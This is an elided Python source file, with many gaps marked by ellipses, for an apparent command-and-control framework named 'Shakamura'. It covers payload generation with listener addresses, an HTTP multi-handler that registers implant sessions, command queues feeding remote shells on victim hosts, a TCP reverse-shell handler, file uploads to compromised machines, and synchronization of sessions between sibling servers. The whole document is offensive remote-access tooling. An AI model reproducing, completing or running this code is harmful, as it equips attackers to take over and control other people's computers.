...
class Payload_Generator:
    ...
    def compute_shakamura(self, payload, user_args):

        # Create session unique id if type == Shakamura
        verify = uuid4().hex[0:6]
        get_cmd = uuid4().hex[0:6]
        post_res = uuid4().hex[0:6]
        header_id = 'Authorization' if not Shakamura_Settings._header else Shakamura_Settings._header
        ...
        Shakamura_Implants_Logger.store_session_details(session_unique_id, Sessions_Manager.legit_session_ids[session_unique_id])

        # Set lhost port
        lhost = f"{payload.parameters['lhost']}:{Shakamura_Settings.bind_port}" if not Shakamura_Settings.ssl_support \
                else f"{payload.parameters['lhost']}:{Shakamura_Settings.bind_port_ssl}"
        ...
        try:
            ...
            if (not args_dict) or (not 'payload' in arguments):
                ...
                if os.path.isfile(f'{cwd}/payload_templates/{template_file_path}.py'):
                    ...
                    if payload.meta['handler'] == 'shakamura' or not Payload_Generator_Settings.validate_lhost_as_ip:
            ...
            if payload.meta['handler'] == 'shakamura':
                self.compute_shakamura(payload, args_dict)
...
class Sessions_Manager:
    ...
    past_generated_sessions = Shakamura_Implants_Logger.retrieve_past_sessions_data()
    ...
    def kill_session(self, session_id):
        ...
        if session_id in self.active_sessions.keys():
            if self.active_sessions[session_id]['Owner'] == Core_Server.SERVER_UNIQUE_ID:
                ...
                Shakamura.dropSession(session_id)

                if self.active_sessions[session_id]['Listener'] == 'shakamura':
                ...
                del Shakamura.command_pool[session_id]
...
# -------------- Shakamura Server -------------- #
class Shakamura(BaseHTTPRequestHandler):

    server_name = f'-[{GREEN}   Shakamura Multi-Handler     {END}]-'
    header_id = Shakamura_Settings._header
    ...
    def cmd_output_interpreter(self, session_id, output, constraint_mode = False):
        ...
        try:
            ...
            sibling_signature = Shakamura.search_output_for_signature(output)
    ...
    def activate_pseudo_shell_session(session_id, os_type):
        ...
        # Define prompt value:
        if prompt:
            Shakamura.afric_prompt = prompt

        else:
            Shakamura.afric_prompt = (hostname + '\\' + uname + '> ') if os_type == 'Windows' else f'{uname}@{hostname}: '

        Shakamura.active_shell = session_id
        Shakamura.prompt_ready = True
        ...
        try:
            ...
            while Shakamura.active_shell:

                if Shakamura.prompt_ready:
                    user_input = input(Shakamura.afric_prompt)
                    ...
                    if cmd_list[0] == 'clear':
                        ...
                        if session_id in Sessions_Manager.active_sessions.keys():
                            ...
                            if os.path.isfile(file_path):
                                ...
                                Shakamura.set_shell_prompt_ready()
                    ...
                    # Run as shell command
                        ...
                        if Shakamura.active_shell:
                            ...
                            if dangerous_input_detected:
                                ...
                                if shell_type == 'unix' and listener == 'shakamura':
                                ...
                                if is_remote_shell:
                                    ...
                                    Shakamura.command_pool[Shakamura.active_shell].append(user_input)
            ...
            Shakamura.command_pool[Shakamura.active_shell] = []
            print('\r')
            Shakamura.deactivate_shell()
    ...
    def deactivate_shell():
        ...
        Shakamura.active_shell = None
        Shakamura.prompt_ready = False
        Shakamura.afric_prompt = None
    ...
    def rst_shell_prompt(prompt = ' > ', prefix = '\r'):
        ...
        Shakamura.prompt_ready = True
        sys.stdout.write(prefix + Shakamura.afric_prompt + global_readline.get_line_buffer())
    ...
    def do_GET(self):
        ...
        # Identify session
        if not Shakamura.header_id:
            header_id_extract = [header.replace("X-", "") for header in self.headers.keys() if re.match("X-[a-z0-9]{4}-[a-z0-9]{4}", header)]
            Shakamura.header_id = f'X-{header_id_extract[0]}'

        try:
            session_id = self.headers.get(Shakamura.header_id)
        ...
        if session_id and (session_id not in Sessions_Manager.active_sessions.keys()):
            ...
            if session_id in Sessions_Manager.legit_session_ids.keys():
                ...
                Sessions_Manager.active_sessions[session_id] = {
                    ...
                    'Owner' : Shakamura.server_unique_id,
                    'self_owned' : True,
                    'aliased' : False,
                    'alias' : None,
                    'Listener' : 'shakamura',
                ...
                Shakamura.command_pool[session_id] = []
        ...
        self.server_version = Shakamura_Settings.server_version
        self.sys_version = ""
        session_id = self.headers.get(Shakamura.header_id)
        ...
        # if url_split[0] in Shakamura.verify and legit:
        ...
        # Grab cmd
            ...
            if len(Shakamura.command_pool[session_id]):

                shakamura_issued_cmd = False
                cmd = Shakamura.command_pool[session_id].pop(0)

                # Check command type:
                # type str = normal
                # type dict = Shakamura issued cmd

                if isinstance(cmd, dict):
                    # shakamura_issued_cmd = True
                    # quiet = cmd['quiet']
                    cmd = cmd['data']
            ...
            self.send_response(200)
            self.end_headers()
            self.wfile.write(b'exit 1') # kills crippled shakamura sessions that continue to spam requests
            pass
                    ...
                    try:
                        ...
                        if not isinstance(output, int):
                            ...
                            if isinstance(output, str):
                                ...
                                Main_prompt.set_main_prompt_ready() if not self.active_shell else Shakamura.set_shell_prompt_ready()
    ...
    def do_OPTIONS(self):
        ...
        self.send_header('Access-Control-Allow-Headers', Shakamura_Settings.header_id)
        self.end_headers()
        self.wfile.write(b'OK')
    ...
    def dropSession(session_id):
        ...
        if Sessions_Manager.active_sessions[session_id]['Listener'] == 'shakamura':
            ...
            if Sessions_Manager.active_sessions[session_id]['Shell'] == 'cmd.exe':
                Shakamura.command_pool[session_id].append({'data' : 'exit', 'issuer' : 'self', 'quiet' : True})
                
            elif (os_type == 'Windows' and not outfile) or os_type == 'Linux':
                Shakamura.command_pool[session_id].append({'data' : exit_command, 'issuer' : 'self', 'quiet' : True})

            elif os_type == 'Windows' and outfile:
                Shakamura.command_pool[session_id].append({'data' : 'quit', 'issuer' : 'self', 'quiet' : True})
    ...
    def monitor_shell_state(self, session_id):
        ...
        while True:
            ...
            if session_id in Sessions_Manager.active_sessions.keys():
                ...
                sleep(Shakamura_Settings.monitor_shell_state_freq)
...
def initiate_afric_server():
    ...
    try:
        ...
        if (Shakamura_Settings.certfile and not Shakamura_Settings.keyfile) or \
            (Shakamura_Settings.keyfile and not Shakamura_Settings.certfile):
            exit(f'[{DEBUG}] SSL support seems to be misconfigured (missing key or cert file).')

        # Start http server
        port = Shakamura_Settings.bind_port if not Shakamura_Settings.ssl_support else Shakamura_Settings.bind_port_ssl

        try:
            httpd = HTTPServer((Shakamura_Settings.bind_address, port), Shakamura)

        except OSError:
            exit(f'[{DEBUG}] {Shakamura.server_name} failed to start. Port {port} seems to already be in use.\n')

        except:
            exit(f'\n[{DEBUG}] {Shakamura.server_name} failed to start (Unknown error occurred).\n')

        if Shakamura_Settings.ssl_support:
            httpd.socket = ssl.wrap_socket (
                httpd.socket,
                keyfile = Shakamura_Settings.keyfile,
                certfile = Shakamura_Settings.certfile,
                server_side = True,
                ssl_version=ssl.PROTOCOL_TLS
            )


        Shakamura_server = Thread(target = httpd.serve_forever, args = (), name = 'shakamura_server')
        Shakamura_server.daemon = True
...
class Core_Server:
    ...
    def sock_handler(self, conn, address):
                ...
                if server_is_sibling:
                    ...
                    if decrypted_data[0] == 'synchronize_sibling_servers_table':
                        ...
                        if data['session_id'] in Sessions_Manager.active_sessions.keys():
                            Shakamura.command_pool[data['session_id']].append(data['command'])
                        ...
                        if prompt_value:
                            ...
                            if Shakamura.active_shell == session_id:
                                Shakamura.afric_prompt = prompt_value
                        ...
                        response = str(self.encapsulate_dict(Shakamura.active_shell, 'session_id'))
                        ...
                        Core_Server.send_msg(conn, self.response_ack(sibling_id))
                        Main_prompt.set_main_prompt_ready() if not Shakamura.active_shell else Shakamura.set_shell_prompt_ready()
                        ...
                        if Shakamura.active_shell == decrypted_data[1]['session_id']:
                            Shakamura.deactivate_shell()

                        del victim_ip
                        Main_prompt.rst_prompt() if not Shakamura.active_shell else Shakamura.rst_shell_prompt()
                        Core_Server.send_msg(conn, self.response_ack(sibling_id))
        ...
        if rst_prompt:
            Main_prompt.set_main_prompt_ready() if not Shakamura.active_shell \
            else Shakamura.set_shell_prompt_ready()
    ...
    def update_shell_sessions(self, shells_data):
        ...
        if isinstance(shells_data, dict):
            for session_id in shells_data.keys():
                if (session_id not in current_shells) and shells_data[session_id]['Owner'] != Shakamura.server_unique_id:
                ...
                for sibling_id in siblings:
                    ...
                    try:
                        ...
                        if response in ['connection_refused', 'timed_out', 'connection_reset', 'no_route_to_host', 'unknown_error']:
                            ...
                            if Shakamura.active_shell in Sessions_Manager.active_sessions.keys():
                                if Sessions_Manager.active_sessions[Shakamura.active_shell]['Owner'] == sibling_id:
                                    Shakamura.deactivate_shell()
    ...
    def nc_shell_handler(self, conn, address, iface):
            ...
            if TCP_Sock_Handler_Settings.hostname_filter:
                if not self.validate_hostname(hostname) or hostname == 'Undefined':
                    ...
                    if not TCP_Sock_Handler_Settings.hostname_filter_warning_delivered:
                        print_to_prompt(f'\r[{WARN}] A TCP reverse connection was rejected due to hostname validation failure. You can disable this filter by setting hostname_filter to False in Shakamura/Core/settings.py. This warning will be muted for the rest of the session.')
        ...
        while True:
            ...
            if session_id in sessions:
                ...
                if Shakamura.command_pool[session_id]:
                    ...
                    # type dict = Command issued by Shakamura's Utilities
                    ...
                    if not shakamura_issued_cmd and shell == 'powershell.exe':
...
class File_Smuggler:
    ...
    def upload_file(file_contents, destination_path, session_id, issuer = 'self', port = File_Smuggler_Settings.bind_port):
        ...
        try:
            ...
            # Adjust command for shakamura type
            if Sessions_Manager.active_sessions[session_id]['Listener'] == 'shakamura' and issuer != 'self':
                request_file_cmd = request_file_cmd + Exec_Utils.get_sibling_signature(session_id, signature = issuer)

            # Construct Shakamura issued command to request file
            shakamura_cmd = {
            ...
            Shakamura.command_pool[session_id].append(shakamura_cmd)
...
def restore_prompt():
    ...
    if Shakamura.active_shell:
        Shakamura.rst_shell_prompt() if Shakamura.prompt_ready else Shakamura.set_shell_prompt_ready()
